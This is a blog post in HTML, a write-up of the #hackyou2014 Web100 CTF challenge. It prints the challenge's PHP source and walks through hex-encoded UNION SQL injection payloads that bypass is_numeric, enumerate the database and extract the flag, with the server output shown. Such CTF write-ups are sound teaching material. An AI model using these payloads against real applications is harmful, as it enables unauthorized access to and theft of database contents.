@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>#hackyou2014 Web100 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In this level we are presented with some logos we can vote.
+If we look at the source code we can see an interesting comment:
+... &amp;lt;!-- TODO: remove index.phps --&amp;gt; ...  We can grab the source code:
+&amp;lt;?php include &#39;db.php&#39;; session_start(); if (!isset($_SESSION[&#39;login&#39;])) { $_SESSION[&#39;login&#39;] = &#39;guest&#39;.mt_rand(1e5, 1e6); } $login = $_SESSION[&#39;login&#39;]; if (isset($_POST[&#39;submit&#39;])) { if (!isset($_POST[&#39;id&#39;], $_POST[&#39;vote&#39;]) || !is_numeric($_POST[&#39;id&#39;])) die(&#39;Hacking attempt!&#39;); $id = $_POST[&#39;id&#39;]; $vote = (int)$_POST[&#39;vote&#39;]; if ($vote &amp;gt; 5 || $vote &amp;lt; 1) $vote = 1; $q = mysql_query(&amp;quot;INSERT INTO vote VALUES ({$id}, {$vote}, &#39;{$login}&#39;)&amp;quot;); $q = mysql_query(&amp;quot;SELECT id FROM vote WHERE user = &#39;{$login}&#39; GROUP BY id&amp;quot;); echo &#39;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Thank you!">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="#hackyou2014 Web100 write-up">
+    <meta name="twitter:description" content="In this level we are presented with some logos we can vote.
+If we look at the source code we can see an interesting comment:
+... &amp;lt;!-- TODO: remove index.phps --&amp;gt; ...  We can grab the source code:
+&amp;lt;?php include &#39;db.php&#39;; session_start(); if (!isset($_SESSION[&#39;login&#39;])) { $_SESSION[&#39;login&#39;] = &#39;guest&#39;.mt_rand(1e5, 1e6); } $login = $_SESSION[&#39;login&#39;]; if (isset($_POST[&#39;submit&#39;])) { if (!isset($_POST[&#39;id&#39;], $_POST[&#39;vote&#39;]) || !is_numeric($_POST[&#39;id&#39;])) die(&#39;Hacking attempt!&#39;); $id = $_POST[&#39;id&#39;]; $vote = (int)$_POST[&#39;vote&#39;]; if ($vote &amp;gt; 5 || $vote &amp;lt; 1) $vote = 1; $q = mysql_query(&amp;quot;INSERT INTO vote VALUES ({$id}, {$vote}, &#39;{$login}&#39;)&amp;quot;); $q = mysql_query(&amp;quot;SELECT id FROM vote WHERE user = &#39;{$login}&#39; GROUP BY id&amp;quot;); echo &#39;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Thank you!">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="#hackyou2014 Web100 write-up">
+  <meta property="og:description" content="In this level we are presented with some logos we can vote.
+If we look at the source code we can see an interesting comment:
+... &amp;lt;!-- TODO: remove index.phps --&amp;gt; ...  We can grab the source code:
+&amp;lt;?php include &#39;db.php&#39;; session_start(); if (!isset($_SESSION[&#39;login&#39;])) { $_SESSION[&#39;login&#39;] = &#39;guest&#39;.mt_rand(1e5, 1e6); } $login = $_SESSION[&#39;login&#39;]; if (isset($_POST[&#39;submit&#39;])) { if (!isset($_POST[&#39;id&#39;], $_POST[&#39;vote&#39;]) || !is_numeric($_POST[&#39;id&#39;])) die(&#39;Hacking attempt!&#39;); $id = $_POST[&#39;id&#39;]; $vote = (int)$_POST[&#39;vote&#39;]; if ($vote &amp;gt; 5 || $vote &amp;lt; 1) $vote = 1; $q = mysql_query(&amp;quot;INSERT INTO vote VALUES ({$id}, {$vote}, &#39;{$login}&#39;)&amp;quot;); $q = mysql_query(&amp;quot;SELECT id FROM vote WHERE user = &#39;{$login}&#39; GROUP BY id&amp;quot;); echo &#39;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;Thank you!">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">#hackyou2014 Web100 write-up</h1>
+      <p class="post-meta">@pwntester · Jan 15, 2014 · 2 min read</p>
+    </header>
+    <article class="post-content"><p>In this <a href="http://hackyou2014tasks.ctf.su:10080/">level</a> we are presented with some logos we can vote.</p>
+
+<p><img src="/images/octopress/web100-1.png" alt="" /></p>
+
+<p>If we look at the source code we can see an interesting comment:</p>
+
+<pre><code class="language-lang-html">...
+&lt;!-- TODO: remove index.phps --&gt;
+...
+</code></pre>
+
+<p>We can grab the source code:</p>
+
+<pre><code class="language-lang-php"> &lt;?php
+include 'db.php';
+session_start();
+if (!isset($_SESSION['login'])) {
+    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
+}
+$login = $_SESSION['login'];
+
+if (isset($_POST['submit'])) {
+    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
+        die('Hacking attempt!');
+    $id = $_POST['id'];
+    $vote = (int)$_POST['vote'];
+    if ($vote &gt; 5 || $vote &lt; 1)
+        $vote = 1;
+    $q = mysql_query(&quot;INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')&quot;);
+    $q = mysql_query(&quot;SELECT id FROM vote WHERE user = '{$login}' GROUP BY id&quot;);
+    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';
+    echo '&lt;table border=&quot;1&quot;&gt;';
+    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
+    while ($r = mysql_fetch_array($q)) {
+        $arr = mysql_fetch_array(mysql_query(&quot;SELECT title FROM picture WHERE id = &quot;.$r['id']));
+        echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
+        $arr = mysql_fetch_array(mysql_query(&quot;SELECT COUNT(value), AVG(value) FROM vote WHERE id = &quot;.$r['id']));
+        echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;';
+    }
+    echo '&lt;/table&gt;';
+    echo '&lt;br&gt;&lt;a href=&quot;index.php&quot;&gt;Back&lt;/a&gt;&lt;br&gt;';
+    exit;
+}
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Picture Gallery&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;Welcome, &lt;?php echo $login; ?&gt;&lt;/p&gt;
+&lt;p&gt;Help us to choose the best logo!&lt;/p&gt;
+&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+&lt;table border=&quot;1&quot; cellspacing=&quot;5&quot;&gt;
+&lt;tr&gt;
+$q = mysql_query('SELECT * FROM picture');
+while ($r = mysql_fetch_array($q)) {
+    echo '&lt;td&gt;&lt;img src=&quot;./images/'.$r['image'].'&quot;&gt;&lt;div align=&quot;center&quot;&gt;'.$r['title'].'&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;id&quot; value=&quot;'.$r['id'].'&quot;&gt;&lt;/div&gt;&lt;/td&gt;';
+}
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;p&gt;Your vote:
+&lt;select name=&quot;vote&quot;&gt;
+&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
+&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
+&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
+&lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;
+&lt;option value=&quot;5&quot;&gt;5&lt;/option&gt;
+&lt;/select&gt;&lt;/p&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- TODO: remove index.phps --&gt;
+</code></pre>
+
+<p>We cannot inject in <strong>vote</strong> because it is casted to an integer and the value is verified but we can inject in <strong>id</strong> if we can bypass the <strong>is_numeric</strong> function. Actually, it was quite easy, we can submit hexadecimal values and benefit from how <strong>mysql</strong> handles <a href="http://dev.mysql.com/doc/refman/5.0/en/hexadecimal-literals.html">hex literals</a>.
+We can verify the injection submiting:</p>
+
+<pre><code class="language-lang-html">0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729
+999999999999 union all (select 'Hello!!')
+</code></pre>
+
+<p>The server will return:</p>
+
+<p><img src="/images/octopress/web100-2.png" alt="" /></p>
+
+<p>Ok, now we can try something more interesting:</p>
+
+<pre><code class="language-lang-html">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428736368656d615f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e736368656d61746129
+999999999999 union all (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)
+</code></pre>
+
+<pre><code class="language-lang-html">information_schema,mysql,performance_schema,task,test
+</code></pre>
+
+<p>From &ldquo;task&rdquo;</p>
+
+<pre><code class="language-lang-html">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e434154287461626c655f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d20277461736b2729
+999999999999 union all (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'task')
+</code></pre>
+
+<pre><code class="language-lang-html">Flag,picture,vote
+</code></pre>
+
+<p>Now the columns:</p>
+
+<pre><code class="language-lang-html">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f736368656d61203d20277461736b2720616e64207461626c655f6e616d653d27466c61672729
+999999999999 union all (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'task' and table_name='Flag')
+</code></pre>
+
+<pre><code class="language-lang-html">flag
+</code></pre>
+
+<p>And finally:</p>
+
+<pre><code class="language-lang-html">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428666c6167292066726f6d20466c616729
+999999999999 union all (SELECT GROUP_CONCAT(flag) from Flag)
+</code></pre>
+
+<pre><code class="language-lang-html">CTF{820178c33c03aaa7cfe644c691679cf8}
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/php"><span class="tag">PHP</span></a></li>
+        
+          <li><a href="/tags/hackyou2014"><span class="tag">HackYou2014</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2107</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
